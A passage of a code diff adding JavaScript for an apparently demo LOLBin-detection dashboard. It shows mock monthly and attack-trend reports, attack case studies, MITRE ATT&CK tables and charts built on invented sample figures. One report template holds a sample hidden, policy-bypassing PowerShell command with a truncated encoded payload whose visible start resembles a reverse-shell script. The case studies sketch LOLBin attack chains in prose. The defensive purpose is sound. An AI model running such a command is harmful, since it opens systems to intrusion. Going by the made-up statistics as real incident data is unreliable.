+                                    <li class="mb-2">Implement application whitelisting to prevent unauthorized LOLBin usage</li>
+                                    <li>Update network detection signatures to identify the new MSBuild attack pattern</li>
+                                </ol>
+                            </div>
+                        </div>
+                        
+                        <div class="card">
+                            <div class="card-header bg-warning text-dark">
+                                Recommended Actions
+                            </div>
+                            <div class="card-body">
+                                <ol class="mb-0">
+                                    <li class="mb-2">Conduct user awareness training on recognizing suspicious emails</li>
+                                    <li class="mb-2">Review admin account usage and implement additional logging</li>
+                                    <li>Expand LOLBin monitoring to include additional binaries (Msiexec, Odbcconf)</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h2 class="border-bottom pb-2 mb-3">Conclusion</h2>
+                        <p>March 2025 showed a significant increase in LOLBin-based attacks compared to previous months. The security team successfully detected and mitigated most threats, but one high-severity incident resulted in temporary system compromise before remediation.</p>
+                        <p>The emergence of new attack patterns, particularly those using MSBuild and PowerShell, highlights the need for continued vigilance and improved detection capabilities. Implementation of the recommended actions should significantly reduce the risk of successful attacks in the coming month.</p>
+                    </div>
+                `;
+                
+                // Initialize monthly preview charts
+                initializeMonthlyPreviewCharts();
+            }
+            
+            function displayAttackDetectionReport() {
+                document.getElementById('reportPreviewContent').innerHTML = `
+                    <div class="text-center mb-5">
+                        <h1 class="mb-1">Attack Detection Summary</h1>
+                        <p class="text-muted">January - February 2025</p>
+                        <p class="text-muted small">Generated on: 2025-02-20 11:42:15</p>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Attack Trend Analysis</h2>
+                        <p class="mb-3">This report analyzes the trends in LOLBin-based attacks detected over the past two months. The data shows an evolving threat landscape with attackers increasingly leveraging legitimate Windows binaries to evade detection.</p>
+                        
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">Weekly Attack Trends</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="attackTrendChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">Attack Techniques</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="attackTechniquesChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Key Attack Vectors</h2>
+                        <div class="table-responsive">
+                            <table class="table table-striped">
+                                <thead>
+                                    <tr>
+                                        <th>Attack Vector</th>
+                                        <th>Frequency</th>
+                                        <th>Trend</th>
+                                        <th>Primary LOLBin</th>
+                                        <th>Detection Rate</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Phishing + PowerShell</td>
+                                        <td>High</td>
+                                        <td><span class="text-danger"><i class="fas fa-arrow-up"></i> 28%</span></td>
+                                        <td>PowerShell</td>
+                                        <td>92%</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Supply Chain via MSBuild</td>
+                                        <td>Medium</td>
+                                        <td><span class="text-danger"><i class="fas fa-arrow-up"></i> 35%</span></td>
+                                        <td>MSBuild</td>
+                                        <td>78%</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Web Delivery via Regsvr32</td>
+                                        <td>Medium</td>
+                                        <td><span class="text-success"><i class="fas fa-arrow-down"></i> 12%</span></td>
+                                        <td>Regsvr32</td>
+                                        <td>95%</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Drive-by Download</td>
+                                        <td>Medium</td>
+                                        <td><span class="text-secondary"><i class="fas fa-minus"></i> 0%</span></td>
+                                        <td>CertUtil</td>
+                                        <td>88%</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Malicious Document Macros</td>
+                                        <td>High</td>
+                                        <td><span class="text-danger"><i class="fas fa-arrow-up"></i> 15%</span></td>
+                                        <td>PowerShell</td>
+                                        <td>85%</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Attack Case Studies</h2>
+                        
+                        <div class="card mb-4">
+                            <div class="card-header bg-danger text-white">
+                                <h5 class="mb-0">Case Study 1: Supply Chain Attack Using MSBuild</h5>
+                            </div>
+                            <div class="card-body">
+                                <p><strong>Attack Timeline:</strong> February 8-12, 2025</p>
+                                <p><strong>Description:</strong> Attackers compromised a third-party software update server and deployed malicious MSBuild project files that executed when the update process ran.</p>
+                                <p><strong>LOLBins Used:</strong> MSBuild, PowerShell, BITSAdmin</p>
+                                <p><strong>Attack Flow:</strong></p>
+                                <ol>
+                                    <li>Malicious update package deployed containing MSBuild project files</li>
+                                    <li>MSBuild executed the inline task code within the .proj file</li>
+                                    <li>PowerShell scripts downloaded additional payloads using BITSAdmin</li>
+                                    <li>Persistence established using scheduled tasks</li>
+                                </ol>
+                                <p><strong>Detection:</strong> Detected via MSBuild execution with unusual command line parameters and network connections to non-standard domains during the update process.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="card">
+                            <div class="card-header bg-danger text-white">
+                                <h5 class="mb-0">Case Study 2: Phishing Campaign Using PowerShell</h5>
+                            </div>
+                            <div class="card-body">
+                                <p><strong>Attack Timeline:</strong> January 15-22, 2025</p>
+                                <p><strong>Description:</strong> Targeted phishing campaign using malicious Office documents that executed encoded PowerShell commands to establish initial access.</p>
+                                <p><strong>LOLBins Used:</strong> PowerShell, Regsvr32, CertUtil</p>
+                                <p><strong>Attack Flow:</strong></p>
+                                <ol>
+                                    <li>Phishing email with malicious Excel attachment sent to employees</li>
+                                    <li>Document macro executed encoded PowerShell command</li>
+                                    <li>PowerShell downloaded malicious SCT file and executed it via Regsvr32</li>
+                                    <li>Second stage payload downloaded using CertUtil</li>
+                                </ol>
+                                <p><strong>Detection:</strong> Detected via PowerShell executing encoded commands and Regsvr32 making outbound connections to suspicious domains.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h2 class="border-bottom pb-2 mb-3">Emerging Attack Techniques</h2>
+                        <div class="alert alert-warning">
+                            <h5 class="alert-heading">MSBuild Inline Tasks</h5>
+                            <p>Increasing use of MSBuild with inline tasks to execute C# code without compilation. This technique bypasses many application whitelisting controls.</p>
+                        </div>
+                        <div class="alert alert-warning">
+                            <p class="mb-0">Attackers are increasingly combining multiple LOLBins in a single attack chain to evade detection. The most common pattern observed is PowerShell → Regsvr32 → CertUtil, which allows for multi-stage payload delivery with minimal detection surface.</p>
+                        </div>
+                        
+                        <div class="card mt-4">
+                            <div class="card-header bg-primary text-white">
+                                Defensive Recommendations
+                            </div>
+                            <div class="card-body">
+                                <ol>
+                                    <li class="mb-2">Implement application whitelisting to control LOLBin execution</li>
+                                    <li class="mb-2">Enable PowerShell Script Block Logging and Module Logging</li>
+                                    <li class="mb-2">Monitor for unusual parent-child process relationships</li>
+                                    <li class="mb-2">Implement network monitoring for suspicious connections from LOLBins</li>
+                                    <li>Consider application control policies that restrict command-line parameters for LOLBins</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Initialize attack trend charts
+                initializeAttackTrendCharts();
+            }
+            
+            function displayGenericReportPreview(reportName) {
+                document.getElementById('reportPreviewContent').innerHTML = `
+                    <div class="text-center mb-5">
+                        <h1 class="mb-1">${reportName.replace(/_/g, ' ')}</h1>
+                        <p class="text-muted small">Generated preview</p>
+                    </div>
+                    
+                    <div class="alert alert-info">
+                        <h5 class="alert-heading">Preview Information</h5>
+                        <p class="mb-0">This is a generic preview of the report. The actual report would contain detailed information based on the selected time period and report type.</p>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-6 mb-4">
+                            <div class="bg-light p-3 rounded">
+                                <h4 class="mb-3">LOLBins Distribution</h4>
+                                <div style="height: 300px;">
+                                    <canvas id="genericLolbinsChart"></canvas>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6 mb-4">
+                            <div class="bg-light p-3 rounded">
+                                <h4 class="mb-3">Alert Severity</h4>
+                                <div style="height: 300px;">
+                                    <canvas id="genericSeverityChart"></canvas>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header">
+                            Sample Report Content
+                        </div>
+                        <div class="card-body">
+                            <p>This report would include detailed analysis of security events, statistics, and recommendations based on the data collected during the specified period.</p>
+                            <p>Some sections that would be included:</p>
+                            <ul>
+                                <li>Executive Summary</li>
+                                <li>Detailed Alert Analysis</li>
+                                <li>Threat Intelligence</li>
+                                <li>MITRE ATT&CK Mapping</li>
+                                <li>Recommendations</li>
+                            </ul>
+                        </div>
+                    </div>
+                `;
+                
+                // Initialize generic charts
+                initializeGenericCharts();
+            }
+            
+            function displayTemplatePreview(templateName) {
+                document.getElementById('previewTemplateName').textContent = templateName;
+                
+                // Set content based on template type
+                let content = '';
+                
+                switch(templateName) {
+                    case 'Executive Summary':
+                        content = `
+                            <h2 class="report-title">Executive Summary Report</h2>
+                            <p class="text-muted">This template provides a high-level overview of security events designed for management and executives.</p>
+                            
+                            <h3 class="mt-4">Template Sections</h3>
+                            <ul class="list-group mb-4">
+                                <li class="list-group-item">Summary of Key Findings</li>
+                                <li class="list-group-item">Security Metrics and KPIs</li>
+                                <li class="list-group-item">High-Level Threat Overview</li>
+                                <li class="list-group-item">Critical Incidents</li>
+                                <li class="list-group-item">Security Recommendations</li>
+                                <li class="list-group-item">Resource Requirements</li>
+                            </ul>
+                            
+                            <h3 class="mt-4">Sample Visualizations</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="chart-container">
+                                        <canvas id="templateChart1"></canvas>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="chart-container">
+                                        <canvas id="templateChart2"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="alert alert-info mt-4">
+                                <i class="fas fa-lightbulb me-2"></i>
+                                This template is ideal for presenting to executive leadership and focuses on business impact rather than technical details.
+                            </div>
+                        `;
+                        break;
+                        
+                    case 'Technical Detail':
+                        content = `
+                            <h2 class="report-title">Technical Detail Report</h2>
+                            <p class="text-muted">This template provides comprehensive technical analysis of LOLBin detections and attack patterns.</p>
+                            
+                            <h3 class="mt-4">Template Sections</h3>
+                            <ul class="list-group mb-4">
+                                <li class="list-group-item">Executive Summary</li>
+                                <li class="list-group-item">Detailed Alert Analysis</li>
+                                <li class="list-group-item">LOLBin Execution Analysis</li>
+                                <li class="list-group-item">Command Line Parameters</li>
+                                <li class="list-group-item">Process Hierarchy Analysis</li>
+                                <li class="list-group-item">Network Connection Analysis</li>
+                                <li class="list-group-item">MITRE ATT&CK Mapping</li>
+                                <li class="list-group-item">Technical Recommendations</li>
+                            </ul>
+                            
+                            <h3 class="mt-4">Sample Technical Data</h3>
+                            <pre class="bg-dark text-light p-3 rounded">
+PowerShell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8A...
+                            </pre>
+                            
+                            <div class="alert alert-info mt-4">
+                                <i class="fas fa-lightbulb me-2"></i>
+                                This template is ideal for security analysts and technical staff who need detailed information about attack techniques and patterns.
+                            </div>
+                        `;
+                        break;
+                        
+                    case 'MITRE ATT&CK':
+                        content = `
+                            <h2 class="report-title">MITRE ATT&CK Mapping Report</h2>
+                            <p class="text-muted">This template maps detected LOLBin activity to MITRE ATT&CK tactics and techniques.</p>
+                            
+                            <h3 class="mt-4">Template Sections</h3>
+                            <ul class="list-group mb-4">
+                                <li class="list-group-item">Executive Summary</li>
+                                <li class="list-group-item">Threat Actor Techniques</li>
+                                <li class="list-group-item">Detailed MITRE Mapping</li>
+                                <li class="list-group-item">Detection Coverage Analysis</li>
+                                <li class="list-group-item">Defense Evasion Techniques</li>
+                                <li class="list-group-item">Execution Techniques</li>
+                                <li class="list-group-item">Persistence Mechanisms</li>
+                                <li class="list-group-item">Defensive Recommendations</li>
+                            </ul>
+                            
+                            <h3 class="mt-4">Sample MITRE Mapping</h3>
+                            <table class="table table-bordered">
+                                <thead class="bg-light">
+                                    <tr>
+                                        <th>Technique ID</th>
+                                        <th>Name</th>
+                                        <th>LOLBin</th>
+                                        <th>Count</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>T1059.001</td>
+                                        <td>PowerShell</td>
+                                        <td>PowerShell.exe</td>
+                                        <td>42</td>
+                                    </tr>
+                                    <tr>
+                                        <td>T1218.010</td>
+                                        <td>Regsvr32</td>
+                                        <td>Regsvr32.exe</td>
+                                        <td>23</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            
+                            <div class="alert alert-info mt-4">
+                                <i class="fas fa-lightbulb me-2"></i>
+                                This template helps align your security monitoring with the MITRE ATT&CK framework and identify gaps in detection coverage.
+                            </div>
+                        `;
+                        break;
+                        
+                    default:
+                        content = `
+                            <h2 class="report-title">${templateName} Template</h2>
+                            <p class="text-muted">Preview of the ${templateName} report template.</p>
+                            
+                            <div class="alert alert-info mt-4">
+                                <i class="fas fa-info-circle me-2"></i>
+                                Detailed template preview will be shown here. Select this template to generate a report using this format.
+                            </div>
+                        `;
+                }
+                
+                document.getElementById('templatePreviewContent').innerHTML = content;
+                document.getElementById('templatePreviewCard').style.display = 'block';
+                
+                // Initialize template preview charts if they exist
+                if (templateName === 'Executive Summary') {
+                    initializeTemplateCharts();
+                }
+            }
+            
+            function initializePreviewCharts() {
+                // LOLBins distribution chart
+                const lolbinsCtx = document.getElementById('previewLolbinsChart').getContext('2d');
+                new Chart(lolbinsCtx, {
+                    type: 'pie',
+                    data: {
+                        labels: ['PowerShell', 'CertUtil', 'Regsvr32', 'MSHTA', 'BITSAdmin', 'MSBuild', 'Other'],
+                        datasets: [{
+                            data: [42, 28, 23, 15, 14, 8, 27],
+                            backgroundColor: [
+                                '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c', '#9b59b6', '#95a5a6'
+                            ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                position: 'right'
+                            },
+                            title: {
+                                display: false
+                            }
+                        }
+                    }
+                });
+                
+                // Severity distribution chart
+                const severityCtx = document.getElementById('previewSeverityChart').getContext('2d');
+                new Chart(severityCtx, {
+                    type: 'bar',
+                    data: {
+                        labels: ['Low', 'Medium-Low', 'Medium', 'Medium-High', 'High'],
+                        datasets: [{
+                            label: 'Alert Count',
+                            data: [15, 22, 35, 28, 18],
+                            backgroundColor: [
+                                '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c'
+                            ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                display: false
+                            }
+                        },
+                        scales: {
+                            y: {
+                                beginAtZero: true,
+                                ticks: {
+                                    precision: 0
+                                }
+                            }
+                        }
+                    }
+                });
+            }
+            
+            function initializeMonthlyPreviewCharts() {
+                // Trend chart
+                const trendCtx = document.getElementById('previewTrendChart').getContext('2d');
+                new Chart(trendCtx, {
+                    type: 'line',
+                    data: {
+                        labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
+                        datasets: [{
+                            label: 'Alerts',
+                            data: [65, 82, 97, 98],
+                            borderColor: '#3498db',
+                            backgroundColor: 'rgba(52, 152, 219, 0.1)',
+                            borderWidth: 2,
+                            tension: 0.3,
+                            fill: true
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                display: false
+                            }
+                        },
+                        scales: {
+                            y: {
+                                beginAtZero: true,
+                                ticks: {
+                                    precision: 0
+                                }
+                            }
+                        }
+                    }
+                });
+                
+                // LOLBins distribution chart
+                const lolbinsCtx = document.getElementById('previewMonthlyLolbinsChart').getContext('2d');
+                new Chart(lolbinsCtx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['PowerShell', 'Regsvr32', 'CertUtil', 'MSHTA', 'BITSAdmin', 'MSBuild', 'Other'],
+                        datasets: [{
+                            data: [124, 76, 52, 34, 28, 18, 10],
+                            backgroundColor: [
+                                '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c', '#9b59b6', '#95a5a6'
+                            ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                position: 'right'
+                            }
+                        }
+                    }
+                });
+            }
+            
+            function initializeAttackTrendCharts() {
+                // Attack trend chart
+                const trendCtx = document.getElementById('attackTrendChart').getContext('2d');
+                new Chart(trendCtx, {
+                    type: 'line',
+                    data: {
+                        labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4', 'Week 5', 'Week 6', 'Week 7', 'Week 8'],
+                        datasets: [{
+                            label: 'Attack Count',
+                            data: [12, 15, 18, 22, 18, 25, 32, 38],
+                            borderColor: '#e74c3c',
+                            backgroundColor: 'rgba(231, 76, 60, 0.1)',
+                            borderWidth: 2,
+                            tension: 0.3,
+                            fill: true
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                display: false
+                            }
+                        },
+                        scales: {
+                            y: {
+                                beginAtZero: true,
+                                ticks: {
+                                    precision: 0
+                                }
+                            }
+                        }
+                    }
+                });
+                
+                // Attack techniques chart
+                const techniquesCtx = document.getElementById('attackTechniquesChart').getContext('2d');
+                new Chart(techniquesCtx, {
+                    type: 'radar',
+                    data: {
+                        labels: ['PowerShell', 'SCT Scripts', 'File Downloads', 'Encoded Commands', 'Task Scheduling', 'DLL Hijacking'],
+                        datasets: [{
+                            label: 'Jan 2025',
+                            data: [65, 45, 70, 55, 60, 40],
+                            borderColor: '#3498db',
+                            backgroundColor: 'rgba(52, 152, 219, 0.2)',
+                            borderWidth: 2
+                        }, {
+                            label: 'Feb 2025',
+                            data: [75, 58, 65, 80, 65, 55],
+                            borderColor: '#e74c3c',
+                            backgroundColor: 'rgba(231, 76, 60, 0.2)',
+                            borderWidth: 2
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        scales: {
+                            r: {
+                                beginAtZero: true,
+                                max: 100,
+                                ticks: {
+                                    display: false
+                                }
+                            }
+                        }
+                    }
+                });
+            }
+            
+            function initializeGenericCharts() {
+                // LOLBins distribution chart
+                const lolbinsCtx = document.getElementById('genericLolbinsChart').getContext('2d');
+                new Chart(lolbinsCtx, {
+                    type: 'pie',
+                    data: {
+                        labels: ['PowerShell', 'CertUtil', 'Regsvr32', 'MSHTA', 'BITSAdmin', 'MSBuild', 'Other'],
+                        datasets: [{
+                            data: [35, 25, 18, 12, 8, 5, 7],
+                            backgroundColor: [
+                                '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c', '#9b59b6', '#95a5a6'
+                            ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                position: 'right'
+                            }
+                        }
+                    }
+                });
+                
+                // Severity distribution chart
+                const severityCtx = document.getElementById('genericSeverityChart').getContext('2d');
+                new Chart(severityCtx, {
+                    type: 'bar',
+                    data: {
+                        labels: ['Low', 'Medium-Low', 'Medium', 'Medium-High', 'High'],
+                        datasets: [{
+                            label: 'Alert Count',
+                            data: [15, 22, 35, 28, 18],
+                            backgroundColor: [
+                                '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c'
+                            ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                display: false
+                            }
+                        },
+                        scales: {
+                            y: {
+                                beginAtZero: true,
+                                ticks: {
+                                    precision: 0
+                                }
+                            }
+                        }
+                    }
+                });
+            }
+            
+            function initializeTemplateCharts() {
+                // Template chart 1 - LOLBins over time
+                const chart1Ctx = document.getElementById('templateChart1').getContext('2d');
+                new Chart(chart1Ctx, {
+                    type: 'line',
+                    data: {
+                        labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
+                        datasets: [{
+                            label: 'PowerShell',
+                            data: [15, 18, 12, 22],
+                            borderColor: '#3498db',
+                            backgroundColor: 'transparent',
+                            borderWidth: 2
+                        }, {
+                            label: 'CertUtil',
+                            data: [8, 12, 6, 9],
+                            borderColor: '#2ecc71',
+                            backgroundColor: 'transparent',
+                            borderWidth: 2
+                        }, {
+                            label: 'Regsvr32',
+                            data: [5, 8, 10, 6],
+                            borderColor: '#f39c12',
+                            backgroundColor: 'transparent',
+                            borderWidth: 2
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        scales: {
+                            y: {
+                                beginAtZero: true
+                            }
+                        }
+                    }
+                });
+                
+                // Template chart 2 - Severity distribution
+                const chart2Ctx = document.getElementById('templateChart2').getContext('2d');
+                new Chart(chart2Ctx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['Low', 'Medium', 'High'],
+                        datasets: [{
+                            data: [30, 45, 25],
+                            backgroundColor: ['#3498db', '#f39c12', '#e74c3c'],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false
+                    }
+                });
+            }
+            
+            function downloadReport(reportName, format) {
+                // In a real app, this would trigger an API call to download the report file
+                alert(`Downloading ${reportName} in ${format.toUpperCase()} format...`);
+            }
+            
+            function filterReports(filter) {
+                // In a real app, this would filter the reports based on the selected filter
+                console.log(`Filtering reports by: ${filter}`);
+                
+                // Just a visual indication for demo purposes
+                const rows = document.querySelectorAll('#reportsList tr');
+                
+                switch(filter) {
+                    case 'recent':
+                        // Show only reports from the last 7 days
+                        const oneWeekAgo = new Date();
+                        oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
+                        
+                        rows.forEach(row => {
+                            const dateStr = row.cells[1].textContent;
+                            const reportDate = new Date(dateStr);
+                            
+                            row.style.display = reportDate >= oneWeekAgo ? '' : 'none';
+                        });
+                        break;
+                        
+                    case 'favorites':
+                        // Show only favorited reports
+                        rows.forEach(row => {
+                            const favoriteBtn = row.querySelector('.favorite-btn');
+                            const isFavorite = favoriteBtn && favoriteBtn.querySelector('i').classList.contains('fas');
+                            
+                            row.style.display = isFavorite ? '' : 'none';
+                        });
+                        break;
+                        
+                    default:
+                        // Show all reports
+                        rows.forEach(row => {
+                            row.style.display = '';
+                        });
+                }
+            }
+            
+            function getDaySuffix(day) {
+                if (day >= 11 && day <= 13) {
+                    return 'th';
+                }
+                
+                switch (day % 10) {
+                    case 1: return 'st';
+                    case 2: return 'nd';
+                    case 3: return 'rd';
+                    default: return 'th';
+                }
+            }
+            
+            function showNotification(message, type = 'info') {
+                // Create notification element
+                const notification = document.createElement('div');
+                notification.className = `alert alert-${type} position-fixed bottom-0 end-0 m-3`;
+                notification.style.zIndex = 9999;
+                notification.innerHTML = `
+                    <div class="d-flex align-items-center">
+                        <i class="fas fa-${type === 'success' ? 'check-circle' : 'info-circle'} me-2"></i>
+                        <span>${message}</span>
+                    </div>
+                `;
+                
+                document.body.appendChild(notification);
+                
+                // Remove after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+            }
         });
     </script>
 </body>
